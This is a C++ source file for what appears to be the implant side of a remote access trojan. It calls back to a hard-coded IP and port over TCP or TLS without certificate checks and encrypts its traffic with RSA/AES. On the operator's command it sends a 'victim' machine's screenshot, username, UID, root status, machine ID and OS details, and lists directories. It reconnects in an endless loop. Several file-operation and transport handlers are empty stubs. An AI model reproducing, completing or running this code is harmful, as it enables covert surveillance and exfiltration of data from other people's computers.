/*
Author: ISSAC

*/

#include <iostream>
#include <unistd.h>
#include <cstring>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <sstream>
#include <vector>
#include <tuple>

#include <arpa/inet.h>

///OpenSSL
#include <openssl/ssl.h>
#include <openssl/err.h>

#include "clsEDP.hpp"
#include "clsTools.hpp"
#include "clsVictim.hpp"

#include "clsInfoSpyder.hpp"
#include "clsScreenshot.hpp"
#include "clsFileMgr.hpp"

std::string g_szIP = "10.98.242.96";
uint16_t g_nPort = 5000;

const int g_nREAD_LENGTH = 65535;

std::ostringstream g_oss;

enum enConnectionMethod
{
    TCP,
    TLS,
    HTTP,
    DNS,
};

void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
{
    if (vsMsg.size() == 0)
        return;

    if (vsMsg[0] == "info")
    {
        clsInfoSpyder spy;
        clsScreenshot screen;

        auto stInfo = spy.m_info;
        std::string szImg = "X";
        if (stInfo.m_bHasDesktop)
        {
            auto stImage = screen.fnScreenshot();
            szImg = clsEZData::fnb64Encode(stImage.vuData);
        }

        std::vector<std::string> vsInfo = {
            "info",
            szImg,
            stInfo.m_bHasDesktop ? "1" : "0",
            stInfo.m_szIPv4,
            stInfo.m_szMachineID,
            stInfo.m_szUsername,
            std::to_string(stInfo.m_nUid),
            stInfo.m_bIsRoot ? "1" : "0",
            stInfo.m_szOSName,
        };

        victim.fnSendCommand(vsInfo);
    }
    else if (vsMsg[0] == "file")
    {
        clsFileMgr fileMgr;

        if (vsMsg[1] == "init")
        {
            std::vector<std::string> vsMsg = {
                "file",
                "init",
                fileMgr.m_szInitFileDir,
            };

            victim.fnSendCommand(vsMsg);
        }
        else if (vsMsg[1] == "sd")
        {
            auto ls = fileMgr.fnScandir(vsMsg[2]);
            std::vector<std::vector<std::string>> v2d;

            for (auto& s : ls)
            {
                std::vector<std::string> x = {
                    s.mIsDir ? "1" : "0",
                    s.szFilePath,
                    std::to_string(s.nFileSize),
                    s.szPermission,
                    s.szCreationDate,
                    s.szLastModifiedDate,
                    s.szLastAccessedDate,
                };

                v2d.push_back(x);
            }

            std::vector<std::string> vuMsg = {
                "file",
                "sd",
                vsMsg[2],
                clsEZData::fnszSend2dParser(v2d, ","),
            };

            victim.fnSendCommand(vuMsg);
        }
        else if (vsMsg[1] == "wf")
        {

        }
        else if (vsMsg[1] == "rf")
        {

        }
        else if (vsMsg[1] == "df")
        {

        }
        else if (vsMsg[1] == "uf")
        {

        }
        else if (vsMsg[1] == "del")
        {

        }
        else if (vsMsg[1] == "cp")
        {

        }
        else if (vsMsg[1] == "mv")
        {

        }
    }
}

void fnTcpHandler(int sktSrv)
{
    clsTools::fnLogInfo("Starting session...");

    int nRecv = 0;
    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
    std::vector<unsigned char> vuDynamicRecvBuf;

    clsVictim victim(sktSrv);

    // initial handshake
    victim.fnSendCmdParam(0, 0);

    do
    {
        // Receive data
        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
        nRecv = recv(sktSrv, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);

        if (nRecv <= 0)
            break; // socket closed or error

        // Append to dynamic buffer
        vuDynamicRecvBuf.insert(
            vuDynamicRecvBuf.end(),
            vuStaticRecvBuf.begin(),
            vuStaticRecvBuf.begin() + nRecv);

        // --- Process complete packets ---
        while (true)
        {
            // not enough for header yet
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE)
                break;

            auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);

            // incomplete packet — wait for next recv
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
                break;

            // construct EDP from full message
            clsEDP edp(vuDynamicRecvBuf);
            vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet

            auto [cmd, param, len, vuMsg] = edp.fnGetMsg();


            // === handle packet ===
            if (cmd == 0)
            {
                if (param == 0)
                {
                    close(sktSrv);
                }
            }
            else if (cmd == 1)
            {
                if (param == 0)
                {
                    // --- handshake stage 2: receive RSA key ---
                    std::string szb64RSAKey(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                    std::vector<unsigned char> vuRSAKey = clsEZData::fnb64Decode(szb64RSAKey);

                    // create crypto with RSA key
                    clsCrypto crypto(vuRSAKey);
                    victim.m_crypto = crypto;

                    // generate AES key+IV, encrypt, and send
                    auto [vuAESKey, vuAESIV] = victim.m_crypto.fnCreateAESKey();
                    std::vector<unsigned char> ucKey(vuAESKey.begin(), vuAESKey.end());
                    std::vector<unsigned char> ucIV(vuAESIV.begin(), vuAESIV.end());

                    std::ostringstream oss;
                    oss << clsEZData::fnb64Encode(ucKey) << "|" << clsEZData::fnb64Encode(ucIV);

                    std::string szMsg = oss.str();
                    std::string szCipherMsg = clsEZData::fnb64EncodeUtf8(victim.m_crypto.fnvuRSAEncrypt(szMsg));

                    victim.fnSend(1, 1, szCipherMsg);
                }
                else if (param == 2)
                {
                    std::string szChallenge(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                    std::string szCipher = clsEZData::fnb64EncodeUtf8(victim.m_crypto.fnvuAESEncrypt(szChallenge));

                    victim.fnSend(1, 3, szCipher);
                }
            }
            else if (cmd == 2)
            {
                if (param == 0)
                {
                    std::vector<unsigned char> vuPlain = victim.m_crypto.fnvuAESDecrypt(vuMsg);
                    std::string szMsg(vuPlain.begin(), vuPlain.end());

                    auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
                    
                    fnRecvCommand(victim, decoded);
                }
            }
        }

    } while (nRecv > 0);

    clsTools::fnLogInfo("Session is terminated.");
}

void fnHttpHandler(int sktSrv)
{

}

void fnTlsHandler(int nSktSrv, SSL* ssl)
{
    clsVictim victim(nSktSrv, ssl);
    std::string szHello = "Hello TLS Server";
    victim.fnSslSend(szHello);

    std::vector<unsigned char> vuDynamicBuffer;
    std::vector<unsigned char> vuStaticbuffer(clsEDP::MAX_SIZE);
    int nRecv = 0;

    do
    {
        nRecv = SSL_read(ssl, vuStaticbuffer.data(), vuStaticbuffer.size());
        if (nRecv <= 0)
            break;
        
        vuDynamicBuffer.insert(
            vuDynamicBuffer.end(),
            vuStaticbuffer.begin(),
            vuStaticbuffer.begin() + nRecv
        );

        while (vuDynamicBuffer.size() >= clsEDP::HEADER_SIZE)
        {
            auto [cmd, param, len] = clsEDP::fnGetHeader(vuDynamicBuffer);
            if (vuDynamicBuffer.size() < clsEDP::HEADER_SIZE + len)
                break;
            
            clsEDP edp(vuDynamicBuffer);
            vuDynamicBuffer = edp.fnGetMoreData();

            auto [nCmd, nParam, nLength, vuMsg] = edp.fnGetMsg();
            std::string szMsg(vuMsg.begin(), vuMsg.end());
            std::cout << szMsg << std::endl;

        }

    } while (nRecv > 0);
    
}

void fnTcpConnect(std::string& szIP, int nPort)
{
    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in srvAddr {};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(nPort);
    inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);

    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {

        perror("connect");
    }
    else
    {
        fnTcpHandler(sktSrv);
    }

    close(sktSrv);
}

void fnTlsConnect(std::string& szIP, int nPort)
{
    SSL_library_init();
    SSL_load_error_strings();

    const SSL_METHOD* method = TLS_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);

    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);

    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in srvAddr {};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(nPort);
    inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);

    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {
        perror("connect");
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sktSrv);
    if (SSL_connect(ssl) <= 0)
    {
        ERR_print_errors_fp(stderr);
        return;
    }

    fnTlsHandler(sktSrv, ssl);

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sktSrv);
    SSL_CTX_free(ctx);
}

void fnHttpConnect(std::string& szIP, int nPort)
{
    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in srvAddr {};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(nPort);
    inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);

    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {

        perror("connect");
    }
    else
    {
        fnHttpHandler(sktSrv);
    }
}

void fnDnsConnect(std::string& szIP, int nPort)
{

}

int main(int argc, char *argv[])
{
    enConnectionMethod enMethod;

    if (argc >= 3)
    {
        g_szIP = argv[1];
        g_nPort = atoi(argv[2]);

        std::ostringstream oss;

        oss << "Input host: " << g_szIP << ":" << g_nPort;
        clsTools::fnLogInfo(oss.str());
        oss.clear();

        if (argc == 4)
        {
            std::string method(argv[3]);
            method = clsEZData::fnStrToUpper(method);

            clsTools::fnLogInfo("Method: " + method);

            if (method == "TCP")
                enMethod = enConnectionMethod::TCP;
            else if (method == "TLS")
                enMethod = enConnectionMethod::TLS;
            else if (method == "HTTP")
                enMethod = enConnectionMethod::HTTP;
            else if (method == "DNS")
                enMethod = enConnectionMethod::DNS;
        }

        if (enMethod == NULL)
            enMethod = enConnectionMethod::TCP;
    }

    while (true)
    {
        switch (enMethod)
        {
            case enConnectionMethod::TCP:
                fnTcpConnect(g_szIP, g_nPort);
                break;
            case enConnectionMethod::TLS:
                fnTlsConnect(g_szIP, g_nPort);
                break;
            case enConnectionMethod::HTTP:

                break;
            case enConnectionMethod::DNS:

                break;
            default:
                fnTcpConnect(g_szIP, g_nPort);
                break;
        }
    }
}